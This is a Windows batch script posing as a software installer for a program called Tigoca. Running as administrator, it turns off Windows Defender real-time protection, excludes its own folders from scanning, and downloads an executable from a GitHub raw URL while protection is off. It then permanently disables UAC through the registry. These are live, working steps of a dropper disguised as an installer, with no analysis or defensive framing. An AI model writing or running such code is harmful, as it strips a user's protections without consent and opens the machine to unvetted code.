@echo off&color a&mode con: cols=90 lines=29
cls
pushd "%~dp0"
title Tigoca Installer
fltmc >nul 2>&1 || (
 echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\tigocagetadmin.vbs"
	echo UAC.ShellExecute "%~fs0", "", "", "runas", 1 >> "%temp%\tigocagetadmin.vbs"
	"%temp%\tigocagetadmin.vbs"
	del /f /q "%temp%\tigocagetadmin.vbs"
	exit /b
)
REG QUERY "HKU\S-1-5-19" >NUL 2>&1 && (
GOTO InstallWindows
) || (
echo Right click and run as administrator...
echo.
pause
GOTO exit
)

:InstallWindows
cls
echo Tigoca Installer v1.0.4
echo.
echo Public: Togoca team
echo Author: Nguyen Quoc Huy
echo Co-author: Nguyen Kha Thi
echo.
timeout 3

cls
echo Tigoca Installer
echo.
echo -----------------------------------------------------
echo Please do NOT press anything during the installation.
echo -----------------------------------------------------
echo.
timeout 5

cls
echo Tigoca Installer
echo ________________________________________________________
echo 0'/.
echo ________________________________________________________
echo.
echo Creating program directory
echo.
mkdir "C:\Program Files\Tigoca"

cls
echo Tigoca Installer
echo ________________________________________________________
echo =====10'/.
echo ________________________________________________________
echo.
echo Disabling Windows Defender
echo.
powershell Set-MpPreference -DisableRealtimeMonitoring $true

cls
echo Tigoca Installer
echo ________________________________________________________
echo ==========20'/.
echo ________________________________________________________
echo.
echo Adding program directory to Windows Defender exclusion list
echo.
powershell Add-MpPreference -ExclusionPath 'C:\Program Files\Tigoca'
powershell Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Local\Tigoca'

cls
echo Tigoca Install
echo ________________________________________________________
echo ===============30'/.
echo ________________________________________________________
echo.
echo Downloading program
echo.
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/khathiatz/tigoca/master/tigoca.exe','C:\Program Files\Tigoca\Tigoca.exe')

cls
echo Tigoca Install
echo ________________________________________________________
echo ===================================70'/.
echo ________________________________________________________
echo.
echo Download program complete
echo.

cls
echo Tigoca Install
echo ________________________________________________________
echo ========================================80'/.
echo ________________________________________________________
echo.
echo Enabling Windows Defender
echo.
powershell Set-MpPreference -DisableRealtimeMonitoring $false

cls
echo Tigoca Install
echo ________________________________________________________
echo =============================================90'/.
echo ________________________________________________________
echo.
echo Creating shorcut
echo.
mklink "%userprofile%\Desktop\Tigoca" "C:\Program Files\Tigoca\Tigoca.exe"

cls
echo Tigoca Install
echo ________________________________________________________
echo ================================================95'/.
echo ________________________________________________________
echo.
echo Disable UAC
echo.
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

if not exist "C:\Program Files\Tigoca\Tigoca.exe" GOTO InstallError

cls
echo Tigoca Install
echo ________________________________________________________
echo ==================================================100'/.
echo ________________________________________________________
echo.
echo Install complete.
echo.
echo Thank you for trusting us.
echo https://tigocasoftware.wordpress.com
timeout 5
GOTO Exit

:InstallError
del "%userprofile%\Desktop\Tigoca"
cls
echo Tigoca Install
echo ________________________________________________________
echo ======================= ERROR ==========================
echo ________________________________________________________
echo.
echo Install error.
echo.
echo Contact us to fix problem
echo https://tigocasoftware.wordpress.com
echo.
timeout 5
start https://tigocasoftware.wordpress.com
GOTO exit

:Exit
Exit